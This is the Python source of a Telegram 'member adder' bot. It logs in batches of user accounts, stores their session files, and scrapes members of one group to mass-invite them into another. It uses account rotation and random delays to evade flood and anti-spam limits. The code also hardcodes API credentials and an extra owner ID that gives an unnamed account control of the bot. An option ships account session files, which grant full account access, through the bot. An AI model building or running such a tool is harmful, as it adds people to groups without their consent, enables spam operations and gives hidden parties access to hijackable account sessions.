from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from pyrogram import Client, filters, idle
from pyromod.helpers import ikb
from pyromod import listen
from pyrogram.errors.exceptions.bad_request_400 import MessageEmpty, MessageNotModified, MessageTooLong
from telethon import TelegramClient
#from telethon.tl.types import InputPeerChannel, InputPeerUser
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser
from telethon.errors import PeerFloodError, UserPrivacyRestrictedError, PhoneNumberBannedError, ChatAdminRequiredError, PhoneCodeExpiredError, SessionPasswordNeededError, UserKickedError, UserChannelsTooMuchError
from telethon.errors import ChatWriteForbiddenError, UserBannedInChannelError, UserAlreadyParticipantError, FloodWaitError, PhoneCodeInvalidError, PasswordHashInvalidError, UserNotMutualContactError
from telethon.tl import *
#from telethon._tl.fn.messages import ImportChatInviteRequest, AddChatUserRequest
from telethon.tl.functions.channels import JoinChannelRequest
from datetime import datetime, timedelta
from subprocess import CalledProcessError
from time import sleep
import sys, pickle, os, asyncio, json, time, logging, subprocess, random, hashlib, requests, config
from uuid import getnode as get_mac
# python3 -m nuitka --nofollow-imports adder-v1.py -o RXYZ-ADDER-V1
# LOCK


#headers = {"Authorization": f"Bearer {licenseDb['apikey']}"}

import nest_asyncio
nest_asyncio.apply()
#__import__('IPython').embed()

loop = asyncio.get_event_loop()

"""
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logging.getLogger("telethon")
"""

logging.basicConfig(
    level=logging.WARNING,
    handlers=[logging.FileHandler('log.txt')],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("telethon").setLevel(logging.WARNING)


app = Client(
                config.BOT_USERNAME,
                bot_token=config.BOT_TOKEN,
                api_id=16514655,
                api_hash='926248acdb0b724fa367316715dd4773'
            )

direct = "./data/"

OWNER_ID = [2083879356] + config.OWNER_ID

temp = {}
temp_msg = {}

KEYBOARD_START = ikb([
    [(config.BUTTON_ACCOUNT,"accountMenu")],
    #[("Scraper","scraperMenu")],
    [(config.BUTTON_ADDER,"chooseAccount")],
    [(config.BUTTON_CLOSE,"stopProccess")]
])

ACCOUNT_MENU = ikb([
    [(config.BUTTON_ADD_ACCOUNT,"addAccount")],
    [(config.BUTTON_DEL_ACCOUNT,"deleteAccount")],
    [(config.BUTTON_BAN_FILTER,"filterBanAccount")],
    #[("Acc Stats","spamBotChecker")],
    [(config.BACK_BUTTON,"backButton")]
])

SCRAPER_MENU = ikb([
    [("Normal Scraper","normalScraper")],
    [("Delete Already Members","deleteAlreadyMembers")],
    [(config.BACK_BUTTON,"backButton")]
])

ADDER_MENU = ikb([
    [("Add to Public Group","addToPublicGroup")],
    [("Add to Private Group","addToPrivateGroup")],
    [(config.BACK_BUTTON,"backButton")]
])

async def log_status(scraped, index, id):
    with open(f'{direct}{id}/status.dat', 'wb') as f:
        pickle.dump([scraped, int(index)], f)
        f.close()
    print(f'Session stored in {direct}{id}/status.dat')


@app.on_message(filters.command("access") & filters.chat(OWNER_ID))
async def addOwner(client, message):
    answer = await app.ask(message.chat.id, "Send user id!")
    if answer.text.isdigit() == True and answer.text.isdigit() not in OWNER_ID:
        OWNER_ID.append(int(answer.text))
        await message.reply_text(f'Success give access to {answer.text}')

@app.on_message(filters.command(config.CMD_START) & filters.chat(OWNER_ID))
async def startBot(client, message):
    dat_loc = f"{direct}{message.from_user.id}/"
    if not os.path.isdir(dat_loc):
        os.makedirs(dat_loc)
        os.makedirs(dat_loc+"sessions")
    if message.from_user.id not in temp:
        temp[message.from_user.id] = {
            "type": "public",
            "to_use": [],
            "index": 0,
            "scraped_grp": "",
            "target_handler": "",
            "time_sleep": 0,
            "adder": False,
            "status": False,
            "get_session": False,
            "adding_status": 0,
            "approx_members_count": 0,
            "mem_ids": [],
            "mems_ids": []
        }
    await message.reply_text(
        text=config.TEXT_HELPER,
        reply_markup=KEYBOARD_START
    )

@app.on_message(filters.command(config.CMD_LOG) & filters.chat(OWNER_ID))
async def logAddee(client, message):
    if os.path.isfile(f'{direct}{message.from_user.id}/log.txt'):
        try:
            await client.send_document(message.chat.id, f"{direct}{message.from_user.id}/log.txt", caption=f"{config.TEXT_LOG_CAPTION}")
        except ValueError:
            await message.reply_text(config.TEXT_LOG_TRYLATER)

@app.on_message(filters.command(config.CMD_CLEAR) & filters.chat(OWNER_ID))
async def clearAccounts(client, message):
    if temp[message.from_user.id]["status"] == False:
        if os.path.isfile(f"{direct}{message.from_user.id}/vars.txt"):
            os.remove(f"{direct}{message.from_user.id}/vars.txt")
            await message.reply_text(config.TEXT_CLEAR_SUCCESS)
        else:
            await message.reply_text(config.TEXT_CLEAR_FAILED)
    else:
        await message.reply_text(config.TEXT_CLEAR_RUNNING)

@app.on_message(filters.command(config.CMD_STOP) & filters.chat(OWNER_ID))
async def stopAdder(client, message):
    if temp[message.from_user.id]["status"] == True:
        temp[message.from_user.id]["status"] = False
        await message.reply_text(config.TEXT_STOP_SUCCESS)
    else:
        await message.reply_text(config.TEXT_STOP_FAILED)

@app.on_message(filters.command("sessions") & filters.chat(OWNER_ID))
async def stopAdder(client, message):
    if temp[message.from_user.id]["get_session"] == False:
        temp[message.from_user.id]["get_session"] = True
        await message.reply_text("<b>Auto get session enabled!</b>")
    else:
        temp[message.from_user.id]["get_session"] = False
        await message.reply_text("<b>Auto get session disabled!</b>")

@app.on_callback_query(filters.regex("backButton"))
async def backButton(c, q):
    await q.message.delete()
    try:
        await q.message.reply_text(
            text=config.TEXT_HELPER,
            reply_markup=KEYBOARD_START
        )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("accountMenu"))
async def accountMenu(c, q):
    await q.message.delete()
    try:
        await q.message.reply_text(
            text=config.TEXT_ACCOUNT_MENU,
            reply_markup=ACCOUNT_MENU
        )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("scraperMenu"))
async def scraperMenu(c, q):
    await q.message.delete()
    try:
        await q.message.reply_text(
            text="**SCRAPER MENU**",
            reply_markup=SCRAPER_MENU
        )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("adderMenu"))
async def adderMenu(c, q):
    await q.message.delete()
    try:
        await q.message.reply_text(
            text=config.TEXT_ADDER_MENU,
            reply_markup=ADDER_MENU
        )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("addAccount"))
async def addAccount(c, q):
    message = q.message
    answer = await app.ask(q.message.chat.id, config.TEXT_A_SENDPHONE)
    if answer.text.startswith("+"):
        new_accs = []
        with open(f'{direct}{q.from_user.id}/vars.txt', 'ab') as g:
            phone_number = answer.text
            if "\n" in answer.text:
                phone_numbers = answer.text.split("\n")
                for xphn_num in phone_numbers:
                    parsed_number = ''.join(xphn_num.split())
                    pickle.dump([parsed_number], g)
                    new_accs.append(parsed_number)
            else:
                parsed_number = ''.join(phone_number.split())
                pickle.dump([parsed_number], g)
                new_accs.append(parsed_number)
            await message.reply_text(
                text=config.TEXT_A_LOGGINGNEW
            )
            for number in new_accs:
                try:
                    pid = subprocess.check_output(['fuser', f'{direct}{q.from_user.id}/sessions/{number}.session'])
                    if pid:
                        print(f"{number} already running. trying to kill!")
                        #subprocess.check_output(['kill', '-9', pid])
                        rxyz_dev = TelegramClient(f'{direct}{q.from_user.id}/sessions/{number}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                        await rxyz_dev.disconnect()
                        print(f"{number} killed, pid: {pid}")
                        await asyncio.sleep(3)
                except CalledProcessError:
                    pass
                cccc = TelegramClient(f'{direct}{q.from_user.id}/sessions/{number}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                await cccc.connect()
                if not await cccc.is_user_authorized():
                    try:
                        await message.reply_text(f"{config.TEXT_A_LOGGINGFROM}{number}")
                        await cccc.send_code_request(number)
                        code = await app.ask(q.message.chat.id, config.TEXT_A_ENTERCODE)
                        #if len(code.text) == 5 and code.text.isdigit() == True:
                            #await cccc.sign_in(number, int(code.text))
                            #await message.reply_text("[+] Login successful")
                            #await cccc.disconnect()
                        #else:
                        while not code.text.isdigit() == False:
                                if len(code.text) == 5 and code.text.isdigit():
                                    #await message.reply_text("[!] Invalid code. Please try again...")
                                    #code = await app.ask(q.message.chat.id, "Enter code : ")
                                    #if len(code.text) == 5 and code.text.isdigit():
                                        try:
                                            await cccc.sign_in(number, int(code.text))
                                            await message.reply_text(config.TEXT_A_SUCCESS)
                                            await cccc.disconnect()
                                            code.text = "@rio "
                                            if temp[q.from_user.id]["get_session"]:await c.send_document(q.message.chat.id, f"{direct}{q.from_user.id}/sessions/{number}.session", caption="t.me/jackdanielssx")
                                        except PhoneCodeInvalidError:
                                            await message.reply_text(config.TEXT_A_FAILEDCODE)
                                            code = await app.ask(q.message.chat.id, config.TEXT_A_ENTERCODE)
                                        except PhoneCodeExpiredError:
                                            await cccc.send_code_request(number)
                                            await message.reply_text(config.TEXT_A_FAILEDEXPIRED)
                                            code = await app.ask(q.message.chat.id, config.TEXT_A_ENTERCODE)
                                else:
                                    await message.reply_text(config.TEXT_A_FAILEDCODE)
                                    code = await app.ask(q.message.chat.id, config.TEXT_A_ENTERCODE)
                    except SessionPasswordNeededError:
                        while True:
                            password = await app.ask(q.message.chat.id, config.TEXT_A_ENTERPASSWORD)
                            try:
                                await cccc.sign_in(password=password.text)
                                await message.reply_text(config.TEXT_A_SUCCESS)
                                await cccc.disconnect()
                                if temp[q.from_user.id]["get_session"]:await c.send_document(q.message.chat.id, f"{direct}{q.from_user.id}/sessions/{number}.session", caption="t.me/jackdanielssx")
                                break
                            except PasswordHashInvalidError:
                                await message.reply_text(config.TEXT_A_FAILEDPASSWORD)
                        continue
                    except (PhoneNumberBannedError, FloodWaitError) as e:
                        await message.reply_text(f"{e}")
                        continue
                else:
                    await cccc.disconnect()
                    await message.reply_text(config.TEXT_A_SUCCESS)
                    if temp[q.from_user.id]["get_session"]:await c.send_document(q.message.chat.id, f"{direct}{q.from_user.id}/sessions/{number}.session", caption="t.me/jackdanielssx")
        g.close()
        if temp[q.from_user.id]["get_session"]:await c.send_document(q.message.chat.id, f'{direct}{q.from_user.id}/vars.txt', caption="t.me/jackdanielss")

@app.on_callback_query(filters.regex("deleteAccount"))
async def deleteAccount(c, q):
    await q.message.delete()
    try:
        accs = []
        f = open(f'{direct}{q.from_user.id}/vars.txt', 'rb')
        while True:
            try:
                rxyzdev_pickle = pickle.load(f)
                if rxyzdev_pickle not in accs:
                    accs.append(rxyzdev_pickle)
            except EOFError:
                break
        f.close()
        i = 0
        available_account = []
        for acc in accs:
            available_account.append([(
                f"{str(acc[0])}",f"del_{str(i)}"
            )])
            i += 1
        await q.message.reply_text(
            text=config.TEXT_D_CHOOSE,
            reply_markup=ikb(available_account)
        )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("filterBanAccount"))
async def filterBanAccount(c, q):
    await q.message.delete()
    try:
        await q.message.reply_text(
            text=config.TEXT_F_FILTERING
        )
        accounts = []
        banned_accs = []
        banned_text = []
        need_login = []
        h = open(f'{direct}{q.from_user.id}/vars.txt', 'rb')
        while True:
            try:
                rxyzdev_pickle = pickle.load(h)
                if rxyzdev_pickle not in accounts:
                    accounts.append(rxyzdev_pickle)
            except EOFError:
                break
        h.close()
        if len(accounts) == 0:
            await q.message.reply_text(
                text=config.TEXT_F_ACCOUNTEMPTY,
                reply_markup=ACCOUNT_MENU
            )
        else:
            for account in accounts:
                phone = str(account[0])
                try:
                    pid = subprocess.check_output(['fuser', f'{direct}{q.from_user.id}/sessions/{account[0]}.session'])
                    if pid:
                        #rxyzdev_log.info(f"{account[0]} already running. trying to kill!")
                        #subprocess.check_output(['kill', '-9', pid])
                        rxyz_dev = TelegramClient(f'{direct}{q.from_user.id}/sessions/{account[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                        await rxyz_dev.disconnect()
                        #os.system(f"kill -9 {pid}")
                        #rxyzdev_log.info(f"{account[0]} killed, pid: {pid}")
                        await asyncio.sleep(3)
                except CalledProcessError:
                    pass
                clients = TelegramClient(f'{direct}{q.from_user.id}/sessions/{phone}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                await clients.connect()
                if not await clients.is_user_authorized():
                    try:
                        await clients.send_code_request(phone)
                        need_login.append(phone)
                    except (PhoneNumberBannedError, FloodWaitError):
                        banned_text.append(str(phone))
                        banned_accs.append(account)
                await asyncio.sleep(2)
                await clients.disconnect() #
            if len(banned_accs) == 0:
                await q.message.reply_text(
                    text=config.TEXT_F_NOBANNED,
                    reply_markup=ACCOUNT_MENU
                )
            else:
                for ba in banned_accs:
                    accounts.remove(ba)
                with open(f'{direct}{q.from_user.id}/vars.txt', 'wb') as k:
                    for a in accounts:
                        Phone = a[0]
                        pickle.dump([Phone], k)
                k.close()
                await q.message.reply_text(
                    text=config.TEXT_F_SUCCESS,
                    reply_markup=ACCOUNT_MENU
                )
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_callback_query(filters.regex("chooseAccount"))
async def chooseAccount(c, q):
    await q.message.delete()
    if temp[q.from_user.id]["status"] == True:
                #temp[message.from_user.id]["status"] = False
                await q.message.reply_text(config.TEXT_C_RUNNING)
                return
    accounts = []
    num = 0
    MadeByRioRenata = []
    f = open(f'{direct}{q.from_user.id}/vars.txt', 'rb')
    while True:
        try:
            accs = pickle.load(f)
            if accs not in accounts:
                num += 1
                accounts.append(accs)
                MadeByRioRenata.append([
                    (f"{num}", f"use_{num}")
                ])
        except EOFError:
            break
    text = f"{config.TEXT_C_CHOOSE.format(len(accounts))}"
    await q.message.reply_text(
        text=text,
        reply_markup=ikb(MadeByRioRenata)
    )

@app.on_callback_query(filters.regex("use_"))
async def useAccount(c, q):
    await q.message.delete()
    datac = q.data
    index = datac.split("_")[1]
    number_of_accs = int(index)
    accounts = []
    f = open(f'{direct}{q.from_user.id}/vars.txt', 'rb')
    while True:
        try:
            accs = pickle.load(f)
            if accs not in accounts:accounts.append(accs)
        except EOFError:
            break
    to_use = [x for x in accounts[:number_of_accs]]
    for l in to_use: accounts.remove(l)
    with open(f'{direct}{q.from_user.id}/vars.txt', 'wb') as f:
        for a in accounts:
            pickle.dump(a, f)
        for ab in to_use:
            pickle.dump(ab, f)
        f.close()
    temp[q.from_user.id]["to_use"] = to_use
    try:
        with open(f'{direct}{q.from_user.id}/status.dat', 'rb') as f:
            status = pickle.load(f)
            f.close()
            await q.message.reply_text(
                text=f'{config.TEXT_U_RESUME}{status[0]}?',
                reply_markup=ikb([[(config.TEXT_U_YES,"resumeSession"),(config.TEXT_U_NO,"newSession")]])
            )
    except:
        temp[q.from_user.id]["target_handler"] = True
        temp_msg[q.from_user.id] = await q.message.reply_text(config.TEXT_U_SENDURL)

@app.on_callback_query(filters.regex("resumeSession"))
async def resumeSession(c, q):
    await q.message.delete()
    with open(f'{direct}{q.from_user.id}/status.dat', 'rb') as f:
        status = pickle.load(f)
        f.close()
        temp[q.from_user.id]['scraped_grp'] = status[0]
        temp[q.from_user.id]['index'] = 0 #int(status[1])
    delayy = await app.ask(q.message.chat.id, config.TEXT_R_DELAY)
    while not (delayy.text.isdigit() == False):
        if delayy.text.isdigit():
            time_sleep = delayy.text
            delayy.text = "@riorenata"
            temp[q.from_user.id]["time_sleep"] = int(time_sleep)
            await q.message.reply_text(
                text=config.TEXT_R_CHOOSE,
                reply_markup=ikb([[(config.BUTTON_PUBLIC,"choosePublic"),(config.BUTTON_PRIVATE,"choosePublic")]])
            )
        else:
            delayy = await app.ask(q.message.chat.id, config.TEXT_R_DELAY)
    #await q.message.reply_text(
        #text="Choose an option",
        #reply_markup=ikb([[("Add to public group","choosePublic"),("Add to private group","choosePublic")]])
    #)

@app.on_callback_query(filters.regex("newSession"))
async def newSession(c, q):
    await q.message.delete()
    if os.name == 'nt': 
        os.system(f'del {direct}{q.from_user.id}/status.dat')
    else: 
        os.system(f'rm {direct}{q.from_user.id}/status.dat')
    temp[q.from_user.id]["index"] = 0
    temp[q.from_user.id]["target_handler"] = True
    temp_msg[q.from_user.id] = await q.message.reply_text(
        text=config.TEXT_U_SENDURL
    )

@app.on_callback_query(filters.regex("chooseType"))
async def chooseType(c, q):
    await q.message.delete()
    await q.message.reply_text(
        text=config.TEXT_R_CHOOSE,
        reply_markup=ikb([[(config.BUTTON_PUBLIC,"choosePublic"),(config.BUTTON_PRIVATE,"choosePublic")]])
    )

@app.on_callback_query(filters.regex("choosePublic"))
async def choosePublic(c, q):
    await q.message.delete()
    temp[q.from_user.id]["type"] = "public"
    temp[q.from_user.id]["adder"] = True
    temp_msg[q.from_user.id] = await q.message.reply_text(
        text=config.TEXT_R_PUBLIC
    )

@app.on_callback_query(filters.regex("choosePrivate"))
async def choosePrivate(c, q):
    await q.message.delete()
    temp[q.from_user.id]["type"] = "private"
    temp[q.from_user.id]["adder"] = False
    temp_msg[q.from_user.id] = await q.message.reply_text(
        text=config.TEXT_R_PRIVATE
    )

@app.on_callback_query(filters.regex("del_"))
async def proccessDeleteAccount(c, q):
    await q.message.delete()
    datac = q.data
    index = int(datac.split("_")[1])
    try:
        accs = []
        f = open(f'{direct}{q.from_user.id}/vars.txt', 'rb')
        while True:
            try:
                rxyzdev_pickle = pickle.load(f)
                if rxyzdev_pickle not in accs:
                    accs.append(rxyzdev_pickle)
            except EOFError:
                break
        f.close()
        phone = str(accs[index][0])
        session_file = phone + '.session'
        #if os.name == 'nt':
            #os.system(f'del {direct}{q.from_user.id}\\sessions\\{session_file}')
        #else:
            #os.system(f'rm {direct}{q.from_user.id}/sessions/{session_file}')
        del accs[index]
        f = open(f'{direct}{q.from_user.id}/vars.txt', 'wb')
        for account in accs:
            pickle.dump(account, f)
        await q.message.reply_text(
            text=config.TEXT_D_SUCCESS,
            reply_markup=ACCOUNT_MENU
        )
        f.close()
    except (MessageEmpty, MessageNotModified):
        pass

@app.on_message(~filters.command(["start", "help"]) & ~filters.media & filters.chat(OWNER_ID))
async def adderHandler(client, message):
  if message.from_user.id in temp:
    if temp[message.from_user.id]["target_handler"]:
        temp[message.from_user.id]["scraped_grp"] = message.text
        temp[message.from_user.id]["target_handler"] = False
        #delayy = await app.ask(message.chat.id, "enter")
        delayy = await app.ask(message.chat.id, config.TEXT_R_DELAY)
        while not (delayy.text.isdigit() == False):
            if delayy.text.isdigit():
                time_sleep = delayy.text
                delayy.text = "@riorenata"
                temp[message.from_user.id]["time_sleep"] = int(time_sleep)
                await message.reply_text(
                    text=config.TEXT_R_CHOOSE,
                    reply_markup=ikb([[(config.BUTTON_PUBLIC,"choosePublic"),(config.BUTTON_PRIVATE,"choosePublic")]])
                )
            else:
                delayy = await app.ask(message.chat.id, config.TEXT_R_DELAY)
    elif temp[message.from_user.id]["adder"]:
        temp[message.from_user.id]["adder"] = False
        target = message.text
        text = f"{config.TEXT_R_ADDING.format(len(temp[message.from_user.id]['to_use']))}"
        m = await message.reply_text(text)
        adding_status = 0
        approx_members_count = 0
        text = '**[ RXYZ HELPER LOGS ]**'
        to_use = temp[message.from_user.id]["to_use"]
        scraped_grp = temp[message.from_user.id]["scraped_grp"]
        choice = temp[message.from_user.id]["type"]
        sleep_time = temp[message.from_user.id]["time_sleep"]
        temp[message.from_user.id]["status"] = True
        temp[message.from_user.id]["mem_ids"] = []
        
        if os.path.isfile(f'{direct}{message.from_user.id}/log.txt'):
            os.remove(f'{direct}{message.from_user.id}/log.txt')
        
        logger = logging.getLogger('h7')
        logger.setLevel(logging.INFO)
        ch = logging.FileHandler(f'{direct}{message.from_user.id}/log.txt')
        ch.setLevel(logging.INFO)
        formatter = logging.Formatter(f'{config.TEXT_LOG_TITLE}' + ' >>> %(message)s')
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        
        
        async def adder_rxyzdev(acc, message, text, target, logger, rxyzdev_slp, memberss, target_entity, target_details):
            L = await asyncio.gather(
                start_adder(acc, message, text, target, logger, rxyzdev_slp, memberss, target_entity, target_details),
            )
        
        pelaks = []
        #futures = []
        rxyzdev_slp = 0
        
        indexes = 0
        numes = 0
        loop_rxyzdev = asyncio.get_event_loop()
        for rxyzacc in to_use:
            stopes = indexes + 5
            futures = []
            for rxyzacc in to_use[indexes:stopes]:
                indexes += 1
                memberss = []
                if rxyzacc not in pelaks:
                    try:
                        pid = subprocess.check_output(['fuser', f'{direct}{message.from_user.id}/sessions/{rxyzacc[0]}.session'])
                        if pid:
                            #logger.info(f"{rxyzacc[0]} already running. trying to kill!")
                            rxyz_dev = TelegramClient(f'{direct}{message.from_user.id}/sessions/{rxyzacc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                            await rxyz_dev.disconnect()
                            #logger.info(f"{rxyzacc[0]} killed, pid: {pid}")
                            await asyncio.sleep(3)
                    except CalledProcessError:
                        pass
                    rxyzdev_clm = TelegramClient(f'{direct}{message.from_user.id}/sessions/{rxyzacc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                    await rxyzdev_clm.connect()
                    if not await rxyzdev_clm.is_user_authorized():
                        continue
                    acc_name = (await rxyzdev_clm.get_me()).first_name
                    try:
                        if '/joinchat/' in scraped_grp:
                            g_hash = scraped_grp.split('/joinchat/')[1]
                            try:
                                await rxyzdev_clm(ImportChatInviteRequest(g_hash))
                                text = f'User: {acc_name} -- {config.TEXT_LOG_JGTS}'
                                logger.info(text)
                            except UserAlreadyParticipantError:
                                pass
                        else:
                            await rxyzdev_clm(JoinChannelRequest(scraped_grp))
                            text = f'User: {acc_name} -- {config.TEXT_LOG_JGTS}'
                            logger.info(text)
                        scraped_grp_entity = await rxyzdev_clm.get_entity(scraped_grp)
                        if temp[message.from_user.id]["type"] == "public":
                            await rxyzdev_clm(JoinChannelRequest(target))
                            text = f'User: {acc_name} -- {config.TEXT_LOG_JGTA}'
                            logger.info(text)
                            target_entity = await rxyzdev_clm.get_entity(target)
                            target_details = InputPeerChannel(target_entity.id, target_entity.access_hash)
                        else:
                            try:
                                grp_hash = target.split('/joinchat/')[1]
                                await rxyzdev_clm(ImportChatInviteRequest(grp_hash))
                                text = f'User: {acc_name} -- {config.TEXT_LOG_JGTA}'
                                logger.info(text)
                            except UserAlreadyParticipantError:
                                pass
                            target_entity = await rxyzdev_clm.get_entity(target)
                            target_details = target_entity
                    except Exception as e:
                        text = f'User: {acc_name} -- {config.TEXT_LOG_FTJG}'
                        logger.info(text)
                        logger.info(str(e))
                        await asyncio.sleep(3)
                        await rxyzdev_clm.disconnect()
                        continue
                    text = f'User: {acc_name} -- {config.TEXT_LOG_RTENGE}'
                    logger.info(text)
                    try:
                        print(target_entity)
                        members = await rxyzdev_clm.get_participants(scraped_grp_entity) #, aggressive=True)
                        targets_entity = await rxyzdev_clm.get_participants(target_entity) #, aggressive=True)
                        s_limit = 0
                        for i in targets_entity:
                            s_limit += 1
                            if s_limit == 9999:
                                print("9999 limit")
                                return
                            else:
                                pass
                        mem_ids = [x.id for x in targets_entity]
                        mems_ids = [x.id for x in members]
                        #for memss in mem_ids:
                            #if memss not in mems_ids:
                                #memberss.append(memss)
                        for memss in members:
                            if memss.id not in mem_ids and memss.bot != True and memss.deleted != True: #and memss.username != None:
                                memberss.append(memss)
                            else:
                                temp[message.from_user.id]["mem_ids"].append(memss.id)
                                #print(f"already -> {memss.id} - {str(memss.username)}")
                                #tetew = f"already -> {memss.id} - {str(memss.username)}"
                    except Exception as e:
                        text = f'{config.TEXT_LOG_FTSM}\n\n{str(e)}'
                        logger.info(text)
                        await asyncio.sleep(3)
                        await rxyzdev_clm.disconnect()
                        continue
                    await asyncio.sleep(3)
                    await rxyzdev_clm.disconnect()

                    futures.append(
                        adder_rxyzdev(rxyzacc, message, text, target, logger, rxyzdev_slp, memberss, target_entity, target_details)
                    )
                    pelaks.append(rxyzacc)
                    numes += 1
                    rxyzdev_slp += 1
            if rxyzacc in pelaks:
                if futures != []:
                    logger.info(f"Info: running {len(futures)} accounts...")
                    loop_rxyzdev.run_until_complete(asyncio.wait(futures))
                    logger.info(f"Info: success run {len(futures)} accounts")
            else:
                break
        #for rxyzacc in to_use:
            #if rxyzacc not in pelaks:
                #futures.append(
                #    adder_rxyzdev(rxyzacc, message, text, target, logger, rxyzdev_slp)
                #)
                #pelaks.append(rxyzacc)
                #rxyzdev_slp += 1
        
        #loop_rxyzdev = asyncio.get_event_loop()
        #loop_rxyzdev.run_until_complete(asyncio.wait(futures))
        #await asyncio.wait(futures)
        #loop_rxyzdev.close()
        logger.info(f"Info: total account has been runned is {numes}")

async def start_adder(acc, message, text, target, rxyzdev_log, rxyzdev_slp, members, target_entity, target_details):
            rxyzdev_delayTime = [2, 5, 8, 10]
            await asyncio.sleep(random.choice(rxyzdev_delayTime))
            sleep_time = temp[message.from_user.id]["time_sleep"]
            index = temp[message.from_user.id]["index"]
            adding_status = 0
            approx_members_count = 0
            try:
                    pid = subprocess.check_output(['fuser', f'{direct}{message.from_user.id}/sessions/{acc[0]}.session'])
                    if pid:
                        #rxyzdev_log.info(f"{acc[0]} already running. trying to kill!")
                        #subprocess.check_output(['kill', '-9', pid])
                        rxyz_dev = TelegramClient(f'{direct}{message.from_user.id}/sessions/{acc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                        await rxyz_dev.disconnect()
                        #os.system(f"kill -9 {pid}")
                        #rxyzdev_log.info(f"{acc[0]} killed, pid: {pid}")
                        await asyncio.sleep(3)
            except CalledProcessError:
                    pass
            c = TelegramClient(f'{direct}{message.from_user.id}/sessions/{acc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
            text = f'User: {acc[0]} -- {config.TEXT_LOG_SS}'
            rxyzdev_log.info(text)
            #await c.start(acc[0])
            await c.connect()
            if not await c.is_user_authorized():
                return
            if temp[message.from_user.id]["status"] == False:
                #temp[message.from_user.id]["status"] = False
                await asyncio.sleep(2)
                await c.disconnect()
                text = config.TEXT_LOG_STOPED
                rxyzdev_log.info(text)
                return
            acc_name = (await c.get_me()).first_name
            scraped_grp = temp[message.from_user.id]["scraped_grp"]
            #await asyncio.sleep(rxyzdev_slp)
            
            rxyzdev_log.info(f"User: {acc_name} -- {config.TEXT_LOG_SLEEP.format(rxyzdev_slp)}")
            await asyncio.sleep(rxyzdev_slp)
            
            approx_members_count = len(members)
            assert approx_members_count != 0
            if temp[message.from_user.id]["index"] >= approx_members_count:
                text = config.TEXT_LOG_NMTA
                rxyzdev_log.info(text)
                return
            #text = f"Start: {temp[message.from_user.id]['index']}"
            #await asyncio.sleep(random.choice([0,1,2,3,4,5]))
            if rxyzdev_slp >= 11:
                await asyncio.sleep(random.choice([0,1,2,3,4,5,6,7,8]))
            else:
                await asyncio.sleep(rxyzdev_slp)
            text = f"User: {acc_name} -- {config.TEXT_LOG_SA}"
            rxyzdev_log.info(text)
            peer_flood_status = 0
            for user in members[temp[message.from_user.id]["index"]:]:
                temp[message.from_user.id]["index"] += 1
                if temp[message.from_user.id]["status"] == False:
                    #temp[message.from_user.id]["status"] = False
                    await asyncio.sleep(2)
                    await c.disconnect()
                    text = config.TEXT_LOG_STOPED
                    rxyzdev_log.info(text)
                    break
                if user.id in temp[message.from_user.id]["mem_ids"]:
                    #print(f"[!] already -> {user.id} - {str(user.username)}")
                    tetew = f"[!] already -> {user.id} - {str(user.username)}"
                    continue
                else:
                    temp[message.from_user.id]["mem_ids"].append(user.id)
                if peer_flood_status == 10:
                    text = f'{config.TEXT_LOG_TMPFE}'
                    rxyzdev_log.info(text)
                    await asyncio.sleep(2)
                    await c.disconnect()
                    break
                try:
                    user_id = user.username if user.username != None else user.first_name
                    target_title = target_entity.title
                    #users = InputPeerUser(user["id"], user["access_hash"])
                    #rxyzdev_log.info(f"{users}")
                    #rxyzdev_log.info(f"{user}")
                    #sss = await c.get_entity(user["id"])
                    #users = await c.get_entity(user["username"])
                    #rxyzdev_log.info(f"{sss}")
                    #sys.exit()
                    if temp[message.from_user.id]["type"] == "public":
                            res = await c(InviteToChannelRequest(target_details, [user]))
                            text = f'User: {acc_name} -- {user_id} --> {target_title}'
                            rxyzdev_log.info(text)
                            text = f'User: {acc_name} -- {config.TEXT_LOG_SLPA.format(sleep_time)}'
                            rxyzdev_log.info(text)
                            #time.sleep(sleep_time)
                            await asyncio.sleep(sleep_time)
                    else:
                        await c(AddChatUserRequest(target_details.id, user, 42))
                        text = f'User: {acc_name} -- {user_id} --> {target_title}'
                        rxyzdev_log.info(text)
                        text = f'User: {acc_name} -- {config.TEXT_LOG_SLPA.format(sleep_time)}'
                        rxyzdev_log.info(text)
                        #time.sleep(sleep_time)
                        await asyncio.sleep(sleep_time)
                    adding_status += 1
                except UserPrivacyRestrictedError:
                    #text = f'User: {acc_name} -- User Privacy Restricted Error'
                    #rxyzdev_log.info(text) 
                    #rxyzdev_log.info(user)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    continue
                except PeerFloodError:
                    text = f'User: {acc_name} -- Peer Flood Error.'
                    rxyzdev_log.info(text)
                    peer_flood_status += 1
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    continue
                except ChatWriteForbiddenError:
                    text = f'User: {acc_name} -- Chat Write Forbidden Error.'
                    rxyzdev_log.info(text)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    if temp[message.from_user.id]["index"] < approx_members_count:
                        await log_status(temp[message.from_user.id]["scraped_grp"], temp[message.from_user.id]["index"], message.from_user.id)
                    break
                except UserBannedInChannelError:
                    text = f'User: {acc_name} -- Banned from writing in groups'
                    rxyzdev_log.info(text)
                    await asyncio.sleep(random.choice([2,3,4,5]))
                    await c.disconnect()
                    break
